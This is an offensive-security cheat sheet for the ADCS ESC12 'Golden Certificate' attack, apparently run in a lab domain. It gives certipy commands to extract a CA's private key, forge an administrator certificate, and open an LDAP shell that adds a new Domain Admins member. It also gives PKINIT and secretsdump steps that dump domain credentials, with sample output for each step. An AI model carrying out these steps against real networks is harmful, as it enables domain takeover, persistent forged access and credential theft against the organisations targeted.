title: ESC12: Golden Certificate (CA Shell Access)
html:
Conditions: Shell access to the CA server. Extract the CA private key and forge a Golden Certificate for any user — the forged cert is valid and unrevocable until CA key rotation.

Extract CA Certificate + Private Key

certipy ca -backup -u <username>@<domain> -p <password> -dc-ip <dc-ip> -ca '<ca-name>' -target <ca-ip>
certipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23

[*] Action: Backup CA
[*] Backing up CA 'ESSOS-CA'
[*] Saved certificate and private key to 'ESSOS-CA.pfx'

Forge Golden Certificate

certipy forge -ca-pfx '<ca-name>.pfx' -upn <target-user>@<domain>
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local

[*] Action: Forge Certificate
[*] Forged certificate saved to 'administrator_forged.pfx'

Authenticate via LDAP Shell

certipy auth -pfx <target-user>_forged.pfx -ldap-shell
certipy auth -pfx administrator_forged.pfx -ldap-shell

[*] LDAP shell available
# add_user newdomainadmin
# add_user_to_group newdomainadmin "Domain admins"

Authenticate via PKINIT + SecretsDump

# Reforge with a valid template to fix CRL issues
certipy forge -ca-pfx '<ca-name>.pfx' -upn <target-user>@<domain> -template <username>.pfx

gettgtpkinit.py -cert-pfx <target-user>_forged.pfx -dc-ip <dc-ip> "<domain>/<target-user>" admin_tgt.ccache
export KRB5CCNAME=admin_tgt.ccache
secretsdump.py -k <dc-host> -dc-ip <dc-ip>
excerpt: Conditions: Shell access to the CA server. Extract the CA private key and forge a Golden Certificate for any user — the forged cert is valid and unrevocable until CA key rotation. Extract CA Certifica
